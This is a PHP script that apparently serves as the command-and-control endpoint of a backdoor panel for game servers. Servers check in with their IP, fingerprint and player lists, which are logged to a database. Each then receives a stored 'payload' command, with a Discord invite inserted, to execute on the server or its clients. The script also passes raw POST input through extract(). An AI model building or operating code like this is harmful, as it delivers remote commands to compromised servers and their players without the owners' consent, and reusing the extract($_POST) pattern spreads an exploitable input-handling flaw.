<?php

require_once '../../app/Models/includes.php';

//var_dump($_POST);

if (isset($_POST['fingerprint']) && isset($_POST['ip'])) {

	extract($_POST);

	$server_data = Server::GetServerByIP($ip);

	if ($server_data['id'] !== NULL) {

		$GLOBALS['DB']->Update(
			"servers",
			[
				'ip' => $ip
			],
			[
				'last_update' => time()
			],
			false
		);

		$payload_data = Payload::ReadPayloadToServerID($server_data['id']);

		if (!empty($payload_data)) {
			$replaced_payload = str_replace("{{discord_invite}}", "https://discord.gg/MrJUbQ72kj", $payload_data['content']);
			echo json_encode([['clientside' => (bool)$payload_data['clientside'], 'command' => $replaced_payload]]);
		}
	} else {
		echo "[]";
	}
}


if (isset($_POST['playerlist']) && isset($_POST['nbplayer'])) {

	require_once '../app/Models/includes.php';

	extract($_POST);

	$internet_protocole = explode(":", $ip);

	if ($internet_protocole[0] != CSRF::GetVisitorIP()) {
		die("-- 1");
	}

	if (!preg_match('/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\:?([0-9]{1,5})?/', $ip, $match)) {
		die("-- 2");
	}

	if (!isset($ip) || empty(trim($ip))) {
		die("-- 3");
	}

	if (!isset($csrf) || empty(trim($csrf))) {
		die("-- 4");
	}

	if (!isset($nbplayer) || empty(trim($nbplayer))) {
		$nbplayer = 0;
	}

	if (!isset($playerlist) || empty(trim($playerlist))) {
		die("-- 6");
	}

	if (!Server::ServerExistByIP($ip)) {
		die("-- 7");
	}

	$GLOBALS['DB']->Update(
		"servers",
		[
			'ip' => $ip
		],
		[
			'player' => $nbplayer,
			'playerlist' => $playerlist,
			'last_update' => time()
		],
		false
	);

	$slug = "servers-{$ip}-analytics";
	$hours = date("H");

	$minute = date("i");

	if ($minute <= 15) {
		$per = 15;
	} elseif ($minute > 15 && $minute <= 30) {
		$per = 30;
	} elseif ($minute > 30 && $minute <= 45) {
		$per = 45;
	} elseif ($minute > 45 && $minute <= 59) {
		$per = "00";
		$hours = ($hours + 1);
	}

	// if (Chart::isExist($slug, $hours . ":" . $per)) {
	// 	Chart::update($slug, $nbplayer, $hours . ":" . $per);
	// } else {
	// 	Chart::add($slug, $nbplayer, $hours . ":" . $per);
	// }

	$server_data = Server::GetServerByIP($ip);

	$payload_data = Payload::ReadPayloadToServerID($server_data['id']);

	if (!empty($payload_data)) {
		$replaced_payload = str_replace("{{discord_invite}}", "https://discord.gg/MrJUbQ72kj", $payload_data['content']);
		echo $replaced_payload;
	}

	die();
}
